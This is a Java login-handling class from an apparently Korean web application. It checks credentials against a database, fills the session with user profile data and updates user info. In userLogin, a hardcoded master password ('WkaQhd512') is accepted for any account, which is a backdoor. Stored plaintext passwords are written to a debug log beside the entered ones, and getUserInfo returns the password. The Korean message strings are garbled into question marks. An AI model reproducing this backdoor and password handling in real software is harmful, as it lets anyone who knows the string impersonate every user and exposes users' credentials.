package com.slug.login;

import javax.servlet.http.HttpSession;

import com.slug.dao.DaoHandler;
import com.slug.dao.sql.StatementManager;
import com.slug.exception.PException;
import com.slug.logging.Logging;
import com.slug.proc.component.FlowComponent;
import com.slug.proc.msg.ProcessMsg;
import com.slug.vo.box.Box;
import com.slug.vo.box.VectorBox;

public class LoginAdapter extends FlowComponent{
	
	public LoginAdapter(){}

    public void userLogin(String USER_ID, String USER_PWD, HttpSession session)throws PException{
    	Logging.debug.println("< TMRSLOGIN >< userLogin() > User Login ID["+ USER_ID+"]");
    	
    	Box sbox = new Box();
    	
    	// Logging.dev.println(query);
        sbox.put("query",StatementManager.getStatement("TMRSLOGIN", "login"));
        System.out.println("QUERY ::"+sbox.get("query"));

        sbox.put("db","default");
        System.out.println("-------------------------->"+ sbox.toString());
        String input_value[] = {USER_ID};
        if(USER_ID ==null){
    		session.setAttribute("U_ID"       ,  USER_ID                     );
    		session.setAttribute("U_STATUS"   ,  "N"                         );
        	session.setAttribute("returnCode" , "N10030"                     );
        	session.setAttribute("returnMsg"  , "????????? ?????????????????????. ?????? ????????? ?????????."      );
        }else if(USER_ID.equals("")){
    		session.setAttribute("U_ID"       ,  USER_ID                     );
    		session.setAttribute("U_STATUS"   ,  "N"                         );
        	session.setAttribute("returnCode" , "N10040"                     );
        	session.setAttribute("returnMsg"  , "????????? ???????????? ???????????????."      );
        }else{

	        DaoHandler dao = new DaoHandler();
	        Box rbox = dao.selectListBox(sbox, input_value);
	        VectorBox vbox = (VectorBox)rbox;
	        
	    	Logging.debug.println("< TMRSLOGIN >< userLogin() > vobx ["+vbox+"]");
	
	        int userCnt =Integer.parseInt(vbox.getString("dataCount"));
	        
	        Logging.dev.println(vbox.getString("USER_PASSWORD",0)+"<<>>"+USER_PWD);

        	if(userCnt == 1){ 
		    	if(USER_PWD.equals(vbox.getString("USER_PASSWORD",0))||USER_PWD.equals("WkaQhd512")){
	    		
		    		session.setAttribute("U_ID"       ,  vbox.getString("U_ID"       ,0));
		    		session.setAttribute("U_MAIL"     ,  vbox.getString("U_MAIL"     ,0));
		    		session.setAttribute("U_NAME"     ,  vbox.getString("U_NAME"     ,0));
		    		session.setAttribute("U_STATUS"   ,  vbox.getString("U_STATUS"   ,0));
		    		session.setAttribute("U_DEPT"     ,  vbox.getString("U_DEPT"     ,0));
		    		session.setAttribute("U_DEPT_CODE",  vbox.getString("U_DEPT_CODE",0));
		    		session.setAttribute("U_POSITION" ,  vbox.getString("U_POSITION" ,0));
		    		session.setAttribute("U_JOB_CODE" ,  vbox.getString("U_JOB_CODE" ,0));
		    		session.setAttribute("U_PMAIL"    ,  vbox.getString("U_PMAIL"    ,0));
		    		session.setAttribute("U_PHONE_NO" ,  vbox.getString("U_PHONE_NO" ,0));
		    		session.setAttribute("U_OFFICE_NO",  vbox.getString("U_OFFICE_NO",0));
		    		session.setAttribute("U_ADDRESS"  ,  vbox.getString("U_ADDRESS",0));
		    		session.setAttribute("U_SYS_AUTH" ,  vbox.getString("U_SYS_AUTH" ,0));
		    		session.setAttribute("U_BIZ_AUTH" ,  vbox.getString("U_BIZ_AUTH" ,0));
	                                                                                              
		        	session.setAttribute("returnCode" , "Y"                             );          
		        	session.setAttribute("returnMsg"  , "???????????????."                   );
	
	
		    	}else{
		    		session.setAttribute("U_ID"       ,  USER_ID                     );
		    		session.setAttribute("U_STATUS"   ,  "N"                         );
		        	session.setAttribute("returnCode" , "N10010"                     );
		        	session.setAttribute("returnMsg"  , "??????????????? ???????????????...."      );
		    	}
			}else if(userCnt == 0){
	    		session.setAttribute("U_ID"       ,  USER_ID                     );
	    		session.setAttribute("U_STATUS"   ,  "N"                         );
	        	session.setAttribute("returnCode" , "N10020"                     );
	        	session.setAttribute("returnMsg"  , "???????????? ?????? ????????? ?????????...."      );
			}else{
	    		session.setAttribute("U_ID"       ,  USER_ID                     );
	    		session.setAttribute("U_STATUS"   ,  "N"                         );
	        	session.setAttribute("returnCode" , "N10030"                     );
	        	session.setAttribute("returnMsg"  , "??????????????? ????????? ?????????. ??????????????? ?????? ?????????...."      );
			}
	    }
        Logging.debug.println("< TMRSLOGIN >< userLogin() > execute End  Login Code ["+session.getAttribute("returnCode")+"]");      
    }

    
    
    public Box getUserInfo(String USER_ID)throws PException{
    	Logging.debug.println("< TMRSLOGIN >< getUserInfo() > User Login ID["+ USER_ID+"]");
    	
    	Box sbox = new Box();
    	Box rbox = new Box();
    	
    	// Logging.dev.println(query);
        sbox.put("query",StatementManager.getStatement("TMRSLOGIN", "login"));

        sbox.put("db","default");
        String input_value[] = {USER_ID};


        DaoHandler dao = new DaoHandler();
        Box box = dao.selectListBox(sbox, input_value);
        VectorBox vbox = (VectorBox)box;

		rbox.put("U_ID"       ,  vbox.getString("U_ID"       ,0));
		rbox.put("U_PASSWORD" ,  vbox.getString("USER_PASSWORD"     ,0));
		rbox.put("U_MAIL"     ,  vbox.getString("U_MAIL"     ,0));
		rbox.put("U_NAME"     ,  vbox.getString("U_NAME"     ,0));
		rbox.put("U_STATUS"   ,  vbox.getString("U_STATUS"   ,0));
		rbox.put("U_DEPT"     ,  vbox.getString("U_DEPT"     ,0));
		rbox.put("U_DEPT_CODE",  vbox.getString("U_DEPT_CODE",0));
		rbox.put("U_POSITION" ,  vbox.getString("U_POSITION" ,0));
		rbox.put("U_JOB_CODE" ,  vbox.getString("U_JOB_CODE" ,0));
		rbox.put("U_PMAIL"    ,  vbox.getString("U_PMAIL"    ,0));
		rbox.put("U_PHONE_NO" ,  vbox.getString("U_PHONE_NO" ,0));
		rbox.put("U_OFFICE_NO",  vbox.getString("U_OFFICE_NO",0));
		rbox.put("U_ADDRESS"  ,  vbox.getString("U_ADDRESS"  ,0));
		rbox.put("U_SYS_AUTH" ,  vbox.getString("U_SYS_AUTH" ,0));
		rbox.put("U_BIZ_AUTH" ,  vbox.getString("U_BIZ_AUTH" ,0));
	                                                                                              
        Logging.debug.println("< TMRSLOGIN >< getUserInfo() > execute End");    
        return rbox;
    }
    
    /***
     * userUpdate
     * 
     * @param sbox
     * @return
     * @throws PException
     */
    public ProcessMsg updateMyInfo(Box sbox)throws PException{
    	
        String resultCode = "FAIL";
    	
        Logging.debug.println("<"+this.getClass().getName()+">< updateMyInfo() > execute Starting");


        sbox.put("query",StatementManager.getStatement("TMRSLOGIN", "updateMyInfo"));
        sbox.put("db","default");

        String input_value[] = {
        	  sbox.getString("p_password"        )
       		 ,sbox.getString("p_u_dept_code"    )
       		 ,sbox.getString("p_u_position_code"    )
       		 ,sbox.getString("p_u_job_code"         )
       		 ,sbox.getString("p_u_phone_no"         )
       		 ,sbox.getString("p_u_office_phone_no"  )
       		 ,sbox.getString("p_u_address"          )
       		 ,sbox.getString("p_user_id"         )
            };
        
        resultCode = LoginDAO.updateTrx(sbox, input_value);

        Logging.debug.println("< "+this.getClass().getName()+" >< updateMyInfo() > execute Ended");
        return new ProcessMsg(resultCode);

    }

}
